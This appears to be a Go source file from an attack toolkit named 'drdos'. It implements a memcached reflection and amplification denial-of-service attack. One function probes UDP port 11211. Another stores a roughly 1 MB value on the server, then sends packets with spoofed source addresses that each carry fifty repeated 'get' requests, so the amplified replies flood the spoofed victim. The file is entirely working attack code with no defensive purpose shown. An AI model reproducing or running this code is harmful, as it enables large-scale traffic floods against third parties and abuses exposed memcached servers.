package drdos

import (
	"drdos/config"
	"drdos/utils"
	"sync"
)

var memcachemap sync.Map

func CheckMemcache(dstip string, srcip string) error {
	payload := []byte{0, 0, 0, 0, 0, 1, 0, 0, 115, 116, 97, 116, 115, 13, 10}
	dport := 11211
	return utils.SendUdpPack(dstip, srcip, dport, config.ListenPort, payload)
}

func AttackMemcache(dstip string, srcip string, port int) error {
	// 维护一个map，每次攻击前先看一下map是否有值
	dport := 11211
	// 给memcache发送预设值
	task := func(dstip string, srcip string, port int) {
		for i := 0; i < 2; i++ {
			// memcache默认最大为1024 * 1024
			prepayload := []byte{0, 0, 0, 0, 0, 1, 0, 0, 115, 101, 116, 32, 98, 32, 48, 32, 51, 54, 48, 48, 32, 49, 48, 48, 48, 13, 10}
			for i := 0; i < 1000*1000; i++ {
				prepayload = append(prepayload, byte('A'))
			}
			prepayload = append(prepayload, 13)
			prepayload = append(prepayload, 10)
			utils.SendUdpPack(dstip, srcip, dport, port, prepayload)
		}
	}

	// 是否预设值过了，没有的话先go一下，然后退出
	if _, ok := memcachemap.LoadOrStore(dstip, true); !ok {
		task(dstip, srcip, port)
		return nil
	}

	/*
	* https://www.freebuf.com/articles/network/174180.html
	* 从这篇文章看到，可以发起多次Get请求
	 */
	payload := []byte{0, 0, 0, 0, 0, 1, 0, 0}
	req := []byte{103, 101, 116, 32, 98, 32, 98, 32, 98, 32, 98, 32, 98, 13, 10}
	for i := 0; i < 50; i++ {
		payload = append(payload, req...)
	}
	return utils.SendUdpPack(dstip, srcip, dport, port, payload)
}
